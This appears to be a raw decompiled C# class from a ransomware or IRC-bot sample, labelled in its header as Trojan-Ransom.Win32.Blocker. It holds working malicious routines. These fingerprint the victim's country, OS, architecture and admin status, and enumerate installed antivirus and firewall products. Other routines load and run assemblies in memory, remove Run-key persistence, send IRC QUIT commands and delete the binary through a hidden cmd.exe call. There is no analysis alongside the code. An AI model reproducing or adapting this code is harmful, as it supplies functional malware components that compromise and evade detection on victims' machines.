// Decompiled with JetBrains decompiler
// Type: insomnia.Class39
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;

namespace insomnia
{
  internal class Class39
  {
    private const string Field6 = "abcdefghijklmnopqrstuvwxyz";
    private static readonly Random Field5 = new Random();
    public static bool Field4 = false;
    public static string Field3;
    public static string Field2 = "error";
    public static string Field1 = "";

    public static string Method21() => Class39.Method10() + "{" + Class39.Method17() + "|" + Class39.Method19() + "-" + Class39.Method18() + Class39.Method20() + "}" + Class26.Field19;

    public static string Method20() => (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? 1 : 0) != 0 ? "a" : "u";

    public static string Method19()
    {
      string str = "";
      OperatingSystem osVersion = Environment.OSVersion;
      if (osVersion.Platform == PlatformID.Win32NT)
      {
        if (osVersion.Version.Major == 5)
        {
          switch (osVersion.Version.Minor)
          {
            case 0:
              str = "2K";
              break;
            case 1:
              str = "XP";
              break;
            case 2:
              str = "2k3";
              break;
          }
        }
        if (osVersion.Version.Major == 6)
        {
          switch (osVersion.Version.Minor)
          {
            case 0:
              str = "VI";
              break;
            case 1:
              str = "W7";
              break;
            case 2:
              str = "W8";
              break;
          }
        }
      }
      if (str == "")
        str = "XP";
      return str;
    }

    public static string Method18() => Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86") ? "32" : "64";

    public static string Method17()
    {
      try
      {
        string[] strArray = new WebClient().DownloadString("http://api.wipmania.com/").Split(new string[1]
        {
          "<br>"
        }, StringSplitOptions.None);
        Class39.Field2 = strArray[0];
        Class39.Field1 = strArray[1];
      }
      catch
      {
      }
      if (Class39.Field1 == "XX" || Class39.Field1 == "")
      {
        string letterIsoRegionName = RegionInfo.CurrentRegion.ThreeLetterISORegionName;
        foreach (CultureInfo culture in CultureInfo.GetCultures(CultureTypes.SpecificCultures))
        {
          RegionInfo regionInfo = new RegionInfo(culture.LCID);
          if (regionInfo.ThreeLetterISORegionName.ToUpper() == letterIsoRegionName)
            Class39.Field1 = regionInfo.TwoLetterISORegionName;
        }
      }
      return Class39.Field1;
    }

    public static string Method16(string A_0)
    {
      try
      {
        AssemblyName.GetAssemblyName(A_0);
        return ".NET " + Assembly.LoadFile(A_0).ImageRuntimeVersion;
      }
      catch
      {
      }
      return "Native";
    }

    public static string Method15(string A_0)
    {
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      try
      {
        FileStream inputStream = Class39.Method14(A_0);
        byte[] hash = cryptoServiceProvider.ComputeHash((Stream) inputStream);
        inputStream.Close();
        return BitConverter.ToString(hash).Replace("-", "");
      }
      catch
      {
        return "N/A";
      }
    }

    private static FileStream Method14(string A_0) => new FileStream(A_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);

    public static string Method13(int A_0)
    {
      char[] chArray = new char[A_0];
      for (int index = 0; index < A_0; ++index)
        chArray[index] = "abcdefghijklmnopqrstuvwxyz"[Class39.Field5.Next("abcdefghijklmnopqrstuvwxyz".Length)];
      return new string(chArray);
    }

    public static int Method12(int A_0, int A_1) => Class39.Field5.Next(A_0, A_1);

    public static bool Method11(string A_0)
    {
      byte[] rawAssembly = new BinaryReader((Stream) new FileStream(A_0, FileMode.Open, FileAccess.Read)).ReadBytes((int) new FileInfo(A_0).Length);
      try
      {
        Assembly.Load(rawAssembly).EntryPoint.Invoke((object) null, (object[]) null);
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static string Method10()
    {
      try
      {
        if (DateTime.Now.Subtract(System.IO.File.GetCreationTime(Class26.Field20)).TotalHours > 1.0)
          return "";
        return Class13.Field6 ? "nu" : "n";
      }
      catch
      {
      }
      return "";
    }

    public static string Method9()
    {
      string str = "none";
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get())
        str = managementBaseObject["displayName"].ToString();
      return str;
    }

    public static string Method8()
    {
      string str = "none";
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct").Get())
        str = managementBaseObject["displayName"].ToString();
      return str;
    }

    public static string Method7(long A_0)
    {
      string[] strArray = new string[4]
      {
        "GB",
        "MB",
        "KB",
        "Bytes"
      };
      long d2 = (long) Math.Pow(1024.0, (double) (strArray.Length - 1));
      foreach (string str in strArray)
      {
        if (A_0 > d2)
          return string.Format("{0:##.##} {1}", (object) Decimal.Divide((Decimal) A_0, (Decimal) d2), (object) str).Replace(",", ".");
        d2 /= 1024L;
      }
      return "0 Bytes";
    }

    public static void Method6(string A_0)
    {
      Class39.Field3 = A_0;
      new Thread(new ThreadStart(Class39.Method5)).Start();
    }

    private static void Method5() => Assembly.Load(Class39.Method4(Class39.Field3)).EntryPoint.Invoke((object) null, (object[]) null);

    public static byte[] Method4(string A_0) => new BinaryReader((Stream) new FileStream(A_0, FileMode.Open, FileAccess.Read)).ReadBytes((int) new FileInfo(A_0).Length);

    public static void Method3(string A_0, string A_1)
    {
      string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
      RegistryKey registryKey = !(A_0 == "HKCU") ? Registry.LocalMachine.OpenSubKey(name, true) : Registry.CurrentUser.OpenSubKey(name, true);
      using (registryKey)
        registryKey?.DeleteValue(A_1);
    }

    public static void Method2(string A_0)
    {
      try
      {
        try
        {
          Class13.Field8.Method3();
          Class39.Method3(Class13.Field5, Class26.Field5);
        }
        catch
        {
        }
        Class39.Field4 = true;
        Class31.Field13.WriteLine("QUIT :" + A_0);
        Class31.Field13.Close();
        Class31.Field12.Close();
        Class31.Field11.Close();
        System.IO.File.SetAttributes(Class26.Field20, FileAttributes.Normal);
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Class26.Field20,
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(-1);
      }
      catch
      {
      }
    }

    public static void Method1(string A_0)
    {
      try
      {
        Class13.Field8.Method3();
        Class31.Field13.WriteLine("QUIT :" + A_0);
        Class31.Field13.Close();
        Class31.Field12.Close();
        Class31.Field11.Close();
      }
      catch
      {
      }
    }
  }
}
